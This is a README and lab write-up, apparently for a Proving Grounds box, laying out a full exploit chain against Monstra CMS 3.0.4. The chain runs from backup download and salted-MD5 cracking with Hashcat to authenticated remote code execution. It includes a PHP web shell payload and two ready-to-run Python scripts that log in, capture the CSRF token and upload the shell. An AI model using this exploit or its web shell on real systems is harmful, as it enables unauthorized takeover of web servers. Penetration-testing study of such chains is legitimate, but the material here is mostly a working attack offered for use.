# Monstra CMS 3.0.4 - Chain Exploit (Backup Abuse to RCE)

This repository documents an exploit chain for Monstra CMS 3.0.4, leading from information disclosure (Backup Abuse) to Remote Code Execution (RCE).

## 📝 Description
**Target:** Monstra CMS 3.0.4  
**Vulnerabilities:**
1.  **Information Disclosure:** Access to backup files containing hashes and configuration.
2.  **Weak Hashing:** MD5(MD5(pass)+salt) allows for cracking credentials.
3.  **Authenticated RCE:** Arbitrary file upload via the Theme/Chunk editing feature.

---

## 🛠️ Phase 1: Information Disclosure (Backup Abuse)

If access to the admin panel is possible (or via IDOR/Path Traversal), navigate to:
`Admin Panel → System → Backups`

1.  Create and download a backup of the web server.
2.  Extract the archive.
3.  Locate `users.table.xml` to find the user hashes (e.g., Admin, Mike).
4.  Locate `boot/defines.php` to find the static **SALT**.

**Example Findings:**
- **Hash:** `844ffc2c7150b93c4133a6ff2e1a2dba` (Mike)
- **Salt:** `YOUR_SALT_HERE` (Default Monstra Salt)

---

## 🔓 Phase 2: Cracking the Hash

Monstra CMS uses a double MD5 hash with a salt: `md5(md5($pass).$salt)`.

### Hashcat Command
To crack the hash using Hashcat, we use **Mode 2600**.

1.  **Create a rule file (`rule.txt`)** to append the salt to every word in your wordlist:
    ```text
    $Y $O $U $R $\x5F $S $A $L $T $\x5F $H $E $R $E
    ```
    *(Note: `\x5F` represents the underscore `_`)*

2.  **Run Hashcat:**
    ```bash
    hashcat -m 2600 hash.txt rockyou.txt -r rule.txt
    ```

**Result:** `Mike14`

---

## ⚡ Phase 3: Remote Code Execution (RCE)

With the cracked credentials, we can achieve RCE by injecting PHP code into a theme "Chunk".

### Manual Steps:
1.  Log in to the dashboard using the cracked credentials (`Mike:Mike14`).
2.  Navigate to `Admin → Themes → Edit Chunk`.
3.  Create a new chunk or edit an existing one (e.g., `blog`).
4.  Inject the PHP payload:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
5.  Save the file.
6.  Access the shell:
    `http://target/public/themes/default/chunk_name.chunk.php?cmd=whoami`

---

## 🤖 Automated Exploit Script

A Python script is included to automate the RCE phase (Login + Upload Shell).

### Usage
```bash
python3 exploit.py <url> <username> <password>
Example
Bash
python3 exploit.py [http://monster.pg/blog](http://monster.pg/blog) admin Mike14
⚠️ Disclaimer
This content is for educational purposes only. It is intended to help security researchers understand vulnerabilities in legacy CMS systems. Do not use this against systems you do not have permission to test.
```

---

### ملف السكربت `exploit.py`

هذا هو السكربت بعد تنظيفه وتنسيقه ليكون جاهزاً للعمل (بناءً على الكود الذي أرسلته):

```python
#!/usr/bin/env python3
# Exploit Title: Monstra CMS 3.0.4 - Authenticated Remote Code Execution (RCE)
# Description: Uploads a PHP web shell via the Theme/Chunk editor.
# Usage: python3 exploit.py <url> <username> <password>

import requests
import random
import string
import time
import re
import sys

# ======================
# ARGUMENTS CHECK
# ======================
if len(sys.argv) != 4:
    print(f"Usage: python3 {sys.argv[0]} <url> <username> <password>")
    sys.exit(1)

base_url = sys.argv[1].rstrip("/")
username = sys.argv[2]
password = sys.argv[3]

session = requests.Session()

# ======================
# LOGIN
# ======================
login_url = f"{base_url}/admin/index.php?id=dashboard"
login_data = {
    "login": username,
    "password": password,
    "login_submit": "Log In"
}

print("[*] Logging in...")
try:
    response = session.post(login_url, data=login_data)
except requests.exceptions.RequestException as e:
    print(f"[-] Connection failed: {e}")
    sys.exit(1)

if "Dashboard" not in response.text:
    print("[-] Login failed. Check credentials.")
    sys.exit(1)

print("[+] Login successful")
time.sleep(1)

# ======================
# GET CSRF TOKEN
# ======================
print("[*] Retrieving CSRF token...")
edit_url = f"{base_url}/admin/index.php?id=themes&action=add_chunk"
response = session.get(edit_url)

csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', response.text)

if not csrf_match:
    print("[-] CSRF token not found. The structure might be different.")
    sys.exit(1)

token = csrf_match.group(1)
print(f"[+] CSRF token captured: {token[:10]}...")

# ======================
# PREPARE WEB SHELL
# ======================
filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))

# Simple PHP Shell Payload
content = """
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
"""

edit_data = {
    "csrf": token,
    "name": filename,
    "content": content,
    "add_file": "Save"
}

print(f"[*] Uploading shell as '{filename}'...")
response = session.post(edit_url, data=edit_data)
time.sleep(2)

# ======================
# VERIFY & EXECUTE
# ======================
shell_url = f"{base_url}/public/themes/default/{filename}.chunk.php"
check_response = session.get(shell_url)

if check_response.status_code == 200:
    print("\n[+] Shell uploaded successfully!")
    print(f"[+] Shell URL: {shell_url}")
    print(f"[+] Example: {shell_url}?cmd=whoami")
else:
    print("[-] Failed to verify the shell. It might have been blocked or failed to upload.")
```



---
---
---
---
---
---
---







# 🔴 Blacklist 4 – Monstra CMS 3.0.4 Full Exploitation Chain

## Target Information
- Application: Monstra CMS
- Version: 3.0.4
- Environment: XAMPP / Windows
- Tested On: Proving Grounds Practice – Monster

---

## Step 1: Backup Abuse (Credential Disclosure)

After accessing the administrator panel, Monstra CMS allows administrators to create
and download a full website backup.

Location:
Admin Panel → System → Backups

Backup contains:
- Database
- users.table.xml
- Password hashes
- Configuration files

This functionality exposes sensitive authentication data.

---

## Step 2: Extracting Password Hashes

Extracted hash for user Mike from users.table.xml:

844ffc2c7150b93c4133a6ff2e1a2dba

Initial cracking attempts with rockyou.txt failed,
indicating the hash is salted.

---

## Step 3: Salt Discovery

Salt value discovered in:

C:\xampp\htdocs\blog\boot\defines.php

define('MONSTRA_SALT', 'YOUR_SALT_HERE');

The application is using the default salt value.

---

## Step 4: Hash Type & Iteration Detection

Commands used to identify hash type:

echo "YOUR_SALT_HERE" > salt.txt
echo "wazkowski" > pass.txt

echo "a2b4e80cd640aaa6e417febe095dcbfc" \
| ./mdxfind -h MD5 -s salt.txt pass.txt -i 5

Result:
MD5(password + salt) with 2 iterations

---

## Step 5: Hashing Algorithm (Source Code Review)

File reviewed:
engine/Security.php

Hashing mechanism:

md5(md5($password).$salt)

This matches Hashcat mode 2600.

---

## Step 6: Hashcat Rule (Salting)

rule.txt content:

$Y $O $U $R $\x5F $S $A $L $T $\x5F $H $E $R $E

This appends YOUR_SALT_HERE to every candidate password.

---

## Step 7: Cracking the Password

Command used:

hashcat -m 2600 hash.txt rockyou.txt -r rule.txt

Cracked password:
Mike14

---

## Step 8: Authenticated RCE via Theme Chunk Injection

Monstra CMS allows authenticated administrators to inject
arbitrary PHP code via Theme Chunks.

Reference:
https://github.com/monstra-cms/monstra/issues/470

---

## Step 9: Manual Exploitation Steps

1. Login to admin panel
2. Navigate to:
   /admin/index.php?id=themes&action=edit_template&filename=blog
3. Insert PHP payload
4. Save changes
5. Access payload via:
   /public/themes/default/<chunk>.chunk.php

---

## Step 10: Automated RCE Exploit (Python)

#!/usr/bin/env python3
# Monstra CMS 3.0.4 - Authenticated RCE via Theme Chunk

import requests, random, string, re, sys, time

if len(sys.argv) != 4:
    print(f"Usage: python3 {sys.argv[0]} <url> <username> <password>")
    sys.exit(1)

base = sys.argv[1].rstrip("/")
user = sys.argv[2]
pwd  = sys.argv[3]

s = requests.Session()

print("[*] Logging in...")
login = s.post(
    f"{base}/admin/index.php?id=dashboard",
    data={"login":user,"password":pwd,"login_submit":"Log In"}
)

if "Dashboard" not in login.text:
    print("[-] Login failed")
    sys.exit(1)

print("[+] Login successful")

r = s.get(f"{base}/admin/index.php?id=themes&action=add_chunk")
token = re.search(r'name="csrf"\s+value="([^"]+)"', r.text).group(1)

name = ''.join(random.choices(string.ascii_lowercase+string.digits, k=5))

payload = """<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>"""

s.post(
    f"{base}/admin/index.php?id=themes&action=add_chunk",
    data={"csrf":token,"name":name,"content":payload,"add_file":"Save"}
)

shell = f"{base}/public/themes/default/{name}.chunk.php"
print("[+] Shell uploaded:", shell)
print("[+] Try:", shell+"?cmd=whoami")

---

## Final Result

http://monster.pg/blog/public/themes/default/xxxxx.chunk.php?cmd=whoami

Remote Code Execution achieved.

---

## Blacklist 4 – Key Takeaways

- Default salt values lead to credential compromise
- Backup functionality exposes sensitive data
- Theme editors allow PHP injection
- Authenticated access does not imply security
